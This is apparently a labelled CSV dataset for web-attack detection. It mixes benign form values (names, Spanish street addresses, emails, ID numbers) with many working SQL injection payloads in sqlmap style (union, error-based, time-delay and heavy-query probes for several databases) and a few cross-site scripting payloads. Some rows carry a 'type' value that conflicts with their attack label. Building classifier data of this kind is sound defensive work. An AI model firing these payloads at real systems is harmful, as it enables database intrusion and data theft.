Text,attack_type,Label,type
buehlmann.mcdonall@qcole.sn,norm,0,normal
"1') and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('nlfl' like 'nlfl",sqli,1,sql
45699398p,norm,0,normal
"1'+(select yfuu where 1717=1717 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
castell sargatal,norm,0,normal
34260,norm,0,normal
97222758x,norm,0,normal
rawdon,norm,0,normal
0385057340947133,norm,0,normal
a99b3do,norm,0,normal
43814,norm,0,normal
cuquerella valdenebro,norm,0,normal
"1%"") union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
putrino escortell,norm,0,normal
1') or 6793=(select 6793 from pg_sleep(5)) and ('dtzt' like 'dtzt,sqli,1,sql
cerceda,norm,0,normal
urrucha comallonga,norm,0,normal
carlie,norm,0,normal
"callejon tallacarne 175, 6?c",norm,0,normal
de mendonca ors,norm,0,normal
535,norm,0,normal
1'))) and 1743=6793 and ((('rgcv'='rgcv,sqli,1,normal
atabillar,norm,0,normal
1'))) and 5934=2309,sqli,1,normal
"1%"" and 2006=2006",sqli,1,normal
curtis,norm,0,normal
mel,norm,0,normal
2910118261122194,norm,0,normal
8855,norm,0,normal
"toril, 171 5h",norm,0,normal
3621942696943868,norm,0,normal
ricci@redhost.is,norm,0,normal
09491,norm,0,normal
buschoff_fortuna@rudos.zr,norm,0,normal
"-5969"" where 9248=9248 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
"1)) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((8867=8867",sqli,1,normal
wicht,norm,0,normal
3311375296667384,norm,0,normal
1356891564948898,norm,0,normal
arena@productosgarantizados.uy,norm,0,normal
2546840770409858,norm,0,normal
1%');if(8284=6171) select 8284 else drop function mbih--,sqli,1,sql
vies canales,norm,0,normal
7714749780417930,norm,0,normal
"1""));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""nxvp""=""nxvp",sqli,1,sql
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('qfls'='qfls",sqli,1,sql
"1'||(select 'cjwp' where 8681=8681 or 8466=benchmark(5000000,md5(0x694a4745)))||'",sqli,1,sql
talavera panfili,norm,0,normal
talonera,norm,0,normal
"c/ alfonso de armas ayala s/n,",norm,0,normal
mucheng,norm,0,normal
vlez acejas,norm,0,normal
0strop5je0,norm,0,normal
rio bullaque 65,norm,0,normal
"c/ de la sabina, s/n 8?b",norm,0,normal
regis@magritte.us,norm,0,normal
"1%""))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""%""=""",sqli,1,sql
"1'))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"puerta del sol 124, 8?h",norm,0,normal
"1) union all select null,null,null--",sqli,1,sql
1 rlike (select (case when (7689=7689) then 1 else 0x28 end))-- jduw,sqli,1,sql
esclisiado,norm,0,normal
"-5898"")) as fycd where 7135=7135 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
"1"" and 7533=7533 and ""btak"" like ""btak",sqli,1,normal
nella,norm,0,normal
"simancas, 172, 8-d",norm,0,normal
yuvia,norm,0,normal
"1' (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and 'hqqj'='hqqj",sqli,1,sql
1'||(select 'scct' where 2587=2587 and (select * from (select(sleep(5)))fzno))||',sqli,1,sql
57970346l,norm,0,normal
"1' procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
"1 or 8466=benchmark(5000000,md5(0x694a4745))# irvm",sqli,1,normal
"calle valle de salazar, 48,",norm,0,normal
"1"") as paai where 4089=4089 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
40133,norm,0,normal
gasull vadell,norm,0,normal
04458,norm,0,normal
18417,norm,0,normal
felipe olvera s/n 4?g,norm,0,normal
67,norm,0,normal
"1) where 9645=9645 union all select null,null,null--",sqli,1,sql
guadalcanal,norm,0,normal
zandra,norm,0,normal
-6086')) or (6719=7280)*7280 and (('ozbj'='ozbj,sqli,1,normal
44142,norm,0,normal
moskuna@sitcpla.ye,norm,0,normal
sntoma,norm,0,normal
e4te9ad2,norm,0,normal
ulls,norm,0,normal
"-3081""))) or 3736=1899",sqli,1,normal
guerra_russinov@weat.fj,norm,0,normal
"1,row(7937,5067)>(select count(*),concat(0x7171706a71,(select (elt(7937=7937,1))),0x717a767a71,floor(rand(0)*2))x from (select 9974 union select 5497 union select 8209 union select 8147)a group by x)",sqli,1,sql
acr7m6nia,norm,0,normal
shangtia,norm,0,normal
farhan,norm,0,normal
polit lauli,norm,0,normal
"1') as eany where 3169=3169 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
<script id=xss src=http://127.0.0.1></script>,xss,2,xss
mccauley@autobuses-hibridos.ph,norm,0,normal
sofia,norm,0,normal
catalda,norm,0,normal
"1))) and elt(3132=1541,1541) and (((4258=4258",sqli,1,normal
harold_veigel@ilusionarium.sk,norm,0,normal
5449723667500613,norm,0,normal
"c/ cangas del narcea, 97, 12?e",norm,0,normal
-4900')) or 7208=3236,sqli,1,normal
"-3817"") as vugz where 3064=3064 or 9323=9323#",sqli,1,normal
"1'))) or 8466=benchmark(5000000,md5(0x694a4745)) and ((('sqzl'='sqzl",sqli,1,normal
"1"") where 2837=2837 and (3020=3020)*6703--",sqli,1,sql
"llosa de ranes, la",norm,0,normal
1142,norm,0,normal
"<meta http-equiv=""refresh"" content=""0;url=javascript:alert('xss');"">",xss,2,xss
1'||(select 'bupa' from dual where 8548=8548;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
37210,norm,0,normal
chittell@agroibericaingenieros.vg,norm,0,normal
5154,norm,0,normal
hanley,norm,0,normal
"lealtad, 78, 6-h",norm,0,normal
"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",sqli,1,sql
1 where 5691=5691 and (select * from (select(sleep(5)))fzno)--,sqli,1,sql
";!--""<xss>=&{()}""",xss,2,sql
mouchet@007tv.fj,norm,0,normal
suen,norm,0,normal
camas,norm,0,normal
"1',(select (case when (8382=8382) then 1 else 1/(select 0) end))",sqli,1,sql
cubells,norm,0,normal
vilma,norm,0,normal
90179643r,norm,0,normal
"1 where 6077=6077 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
03380,norm,0,normal
"-9856"" union all select 9753--",sqli,1,sql
26141,norm,0,normal
-7675%'))) order by 1--,sqli,1,sql
carstensen@freecreditcheck.vc,norm,0,normal
"calle calderon de la barca, 141",norm,0,normal
"passatge badal, 31,",norm,0,normal
rainmake,norm,0,normal
said,norm,0,normal
8245101859277917,norm,0,normal
"-5026' where 7324=7324 union all select 7324,7324--",sqli,1,sql
tutusaus tenza,norm,0,normal
mota del cuervo,norm,0,normal
ransell,norm,0,normal
borchsenius@peliculasen3d.tm,norm,0,normal
"1"")) as rhea where 2982=2982 or (select * from (select(sleep(5)))ydpu)--",sqli,1,sql
"calle vivero, s/n",norm,0,normal
"-8614') or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
-2912')) order by 1--,sqli,1,sql
24448,norm,0,normal
latimer@puntodevistafotografia.ve,norm,0,normal
prell@davidymamen.tc,norm,0,normal
"1' and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'moyb'='moyb",sqli,1,sql
1);waitfor delay '0:0:5',sqli,1,sql
"1' and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1%')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
"1)) union all select null,null--",sqli,1,sql
5on39taci19,norm,0,normal
"1');call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
castells rel,norm,0,normal
allman,norm,0,normal
es3an7oso,norm,0,normal
malparto,norm,0,normal
"1')) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('dfxd' like 'dfxd",sqli,1,sql
17745,norm,0,normal
74566884x,norm,0,normal
"1'+(select 'zxxh' where 4065=4065 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
tati@callalabocaatiaherminia.travel,norm,0,normal
pujolrs tremosa,norm,0,normal
"1 and make_set(8403=8403,8899)",sqli,1,normal
7207771074495103,norm,0,normal
98,norm,0,normal
vispy,norm,0,normal
"1"") as bpmk where 6412=6412 union all select null,null,null,null#",sqli,1,sql
el-gueba,norm,0,normal
"-6890""))) union all select 1115#",sqli,1,sql
"1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('wgbh'='wgbh",sqli,1,sql
"1)) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((8294=8294",sqli,1,sql
ardie9temente,norm,0,normal
"1') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('ejnt' like 'ejnt",sqli,1,sql
c/ garcia morente 129,norm,0,normal
-8181')) or 5926=3332#,sqli,1,normal
vilhelmi,norm,0,normal
rob,norm,0,normal
-7111' or (8459=8459)*4906,sqli,1,normal
terrill,norm,0,normal
bianchetti@zafranet.se,norm,0,normal
sigenza mosconi,norm,0,normal
"1%' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and '%'='",sqli,1,sql
"-1606'||(select 'qbaa' where 3967=3967 union all select 3967,3967,3967,3967,3967--",sqli,1,sql
mal zurueta,norm,0,normal
"-5278""))) union all select 5264,5264,5264#",sqli,1,sql
-3540 where 7302=7302 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1,sql
story.darby@hostingprofessional.mv,norm,0,normal
14640,norm,0,normal
"pasaje cox 194, 5?f",norm,0,normal
"1"") where 6671=6671 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
8691836176757675,norm,0,normal
"omaas, las",norm,0,normal
boci+o,norm,0,normal
"1%"" and make_set(8403=8403,8899) and ""%""=""",sqli,1,normal
"1%') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('%'='",sqli,1,sql
"1"" and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""vukd""=""vukd",sqli,1,normal
"c/ barrio de recuesto, 195 6-h",norm,0,normal
calamocha,norm,0,normal
"-5148"")) or 5310=8229",sqli,1,normal
3991,norm,0,normal
"1%""))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"1""));select count(*) from generate_series(1,5000000) and ((""bhmu"" like ""bhmu",sqli,1,sql
kara-lyn,norm,0,normal
matas,norm,0,normal
philipp.castella@biopoint.vc,norm,0,normal
16240,norm,0,normal
1%') rlike (select (case when (1210=8664) then 1 else 0x28 end)) and ('%'=',sqli,1,sql
arnoul@suecas.com.il,norm,0,normal
15171,norm,0,normal
gama.da,norm,0,normal
"1'||(select 'xsoq' from dual where 6690=6690 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))||'",sqli,1,sql
8159487475137064,norm,0,normal
08455,norm,0,normal
"1%"";select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
pagny@cpanelweb.yu,norm,0,normal
05510,norm,0,normal
"jose muoz san roman, s/n,",norm,0,normal
-2929'))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((('nzmk'='nzmk,sqli,1,sql
"-1<img src=""mocha:document.cookie=true;"">",xss,2,sql
1'+(select 'mquh' where 3933=3933;select case when 1613=2937 then 1 else null end--,sqli,1,sql
canosa taracena,norm,0,normal
-6244') as szpd where 8445=8445 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1,sql
teitelba,norm,0,normal
"1') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ('pmzp' like 'pmzp",sqli,1,sql
ilsup,norm,0,normal
braden,norm,0,normal
0433193970984111,norm,0,normal
22809,norm,0,normal
1'))) rlike sleep(5) and ((('svuu'='svuu,sqli,1,normal
"1"") where 6632=6632 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",sqli,1,sql
1%') and 2006=2006,sqli,1,normal
casida,norm,0,normal
thibaut,norm,0,normal
50391,norm,0,normal
patanera,norm,0,normal
soubier.roudenko@mtos.is,norm,0,normal
"-4091)) as lqqy where 3030=3030 union all select 3030,3030,3030#",sqli,1,sql
mcgowan,norm,0,normal
8711764865979361,norm,0,normal
spnola ballado,norm,0,normal
"1 where 3535=3535 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
47172,norm,0,normal
">""<layer src=""javascript:document.cookie=true;""></layer>",xss,2,xss
"1"") as aifd where 5962=5962;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli,1,sql
"1"")) as ltco where 3862=3862 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
expendedora,norm,0,normal
rosche7,norm,0,normal
"lapa, la",norm,0,normal
valdearcos de la vega,norm,0,normal
3a869ono,norm,0,normal
blauer,norm,0,normal
58450202a,norm,0,normal
"-4076')) union all select 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--",sqli,1,sql
1))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((2197=2197,sqli,1,sql
currer,norm,0,normal
17982611s,norm,0,normal
"-3955%')) union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",sqli,1,sql
"1' where 3028=3028;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
wines@interanuncios.sn,norm,0,normal
"plaa font, 179",norm,0,normal
guasca,norm,0,normal
"c/ rua mayor, 31, 1?e",norm,0,normal
-8999'))) or 6872=6872 and ((('jare'='jare,sqli,1,normal
-4001')) or 5634=4044--,sqli,1,sql
maitland,norm,0,normal
arbeca,norm,0,normal
"-6020'+(select isrz where 2489=2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",sqli,1,sql
"1,(select (case when (1609=1609) then waitfor delay '0:0:5' else 1609*(select 1609 from master..sysdatabases) end))",sqli,1,sql
innota,norm,0,normal
a6br9442,norm,0,normal
3596,norm,0,normal
39806,norm,0,normal
42120,norm,0,normal
"1') where 6988=6988 union all select null,null,null,null,null,null,null,null--",sqli,1,sql
9553145655570533,norm,0,normal
6onc+hesta,norm,0,normal
51620770f,norm,0,normal
"1'))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('dhqz'='dhqz",sqli,1,sql
iciar,norm,0,normal
"1%'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('%'='",sqli,1,sql
"1%"")) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""%""=""",sqli,1,sql
ren,norm,0,normal
san milln/donemiliaga,norm,0,normal
marcelo,norm,0,normal
"1""))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (((""tzqk"" like ""tzqk",sqli,1,sql
eiji,norm,0,normal
7743,norm,0,normal
embaldosada,norm,0,normal
cojera,norm,0,normal
"-8065""))) order by 1--",sqli,1,sql
52236694z,norm,0,normal
1304,norm,0,normal
viladecavalls,norm,0,normal
1'))) and (select * from (select(sleep(5)))fzno) and ((('yctp'='yctp,sqli,1,sql
funderbu,norm,0,normal
"calle campo charro, 89,",norm,0,normal
1;select (case when (4624=4844) then 4624 else 1/(select 0) end)--,sqli,1,sql
alcarrs,norm,0,normal
idefonsa,norm,0,normal
"1%') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ('%'='",sqli,1,sql
tenesaca chaves,norm,0,normal
dana,norm,0,normal
violette,norm,0,normal
1290238048117290,norm,0,normal
paquet bisbal,norm,0,normal
eoin,norm,0,normal
46,norm,0,normal
cholewin,norm,0,normal
49653086l,norm,0,normal
"1' in boolean mode) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)#",sqli,1,normal
armua,norm,0,normal
"1"")) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""ksrh""=""ksrh",sqli,1,sql
"1') or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ('iifh'='iifh",sqli,1,sql
20223132z,norm,0,normal
5150525226219774,norm,0,normal
61tico,norm,0,normal
ventura,norm,0,normal
mont?acargas,norm,0,normal
andara francino,norm,0,normal
"escuelas 148,",norm,0,normal
"camino al caravanal, 115 12-e",norm,0,normal
-9509') where 9303=9303 order by 1#,sqli,1,normal
"-7528' or make_set(3809=1821,1821) and 'kgch'='kgch",sqli,1,normal
8232,norm,0,normal
"1%"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""%""=""",sqli,1,sql
forua,norm,0,normal
lim@marketingmunicipal.bf,norm,0,normal
-9389') or 8859=3989--,sqli,1,sql
37110,norm,0,normal
vitacco,norm,0,normal
"1"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""uosc""=""uosc",sqli,1,sql
lagunaseca,norm,0,normal
8409,norm,0,normal
1%';select pg_sleep(5)--,sqli,1,sql
vila-rodona,norm,0,normal
reinald,norm,0,normal
"1')) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1%""))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""%""=""",sqli,1,normal
nemesio,norm,0,normal
sagu cnstenla,norm,0,normal
iocntrl,norm,0,normal
2904,norm,0,normal
"-9451""))) union all select 4211,4211,4211,4211,4211,4211,4211--",sqli,1,sql
uju,norm,0,normal
1'))) and 7533=7533 and ((('hoyw'='hoyw,sqli,1,normal
gdowik2,norm,0,normal
0923146348088975,norm,0,normal
barco montull,norm,0,normal
fintzi-tevis@cbgerindote.sv,norm,0,normal
"-8491"" where 6107=6107 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",sqli,1,sql
-4582)) as gvfo where 8885=8885 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli,1,sql
5i852469,norm,0,normal
vilamartn de valdeorras,norm,0,normal
chao,norm,0,normal
4365955387059187,norm,0,normal
"1'||(select 'dpce' from dual where 5261=5261 union all select null,null,null,null,null,null--",sqli,1,sql
f3ac76025,norm,0,normal
calle buenos aires 82 5-d,norm,0,normal
1') where 8128=8128;select (case when (4061=1396) then 4061 else 1/(select 0) end)--,sqli,1,sql
"1"" where 9973=9973 and 2006=2006",sqli,1,normal
kristiansen-fineschi@bijoubijoudiferente.cl,norm,0,normal
delaune@tintasultravioleta.io,norm,0,normal
"1) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",sqli,1,sql
1') rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
